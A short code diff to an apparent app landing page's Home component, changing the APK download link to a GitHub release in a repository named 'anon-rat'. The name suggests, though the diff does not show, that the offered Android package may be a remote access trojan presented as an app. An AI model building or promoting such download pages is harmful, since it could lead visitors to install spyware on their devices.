@@ -1,7 +1,7 @@
 import { Link } from 'react-router-dom'
 import { features } from '../data/features'
 
-const APK_URL = 'https://anonapp.online/anon.apk'
+const APK_URL = 'https://github.com/nails808/anon-rat/releases/latest/download/anon.apk'
 
 export function Home() {
   return (
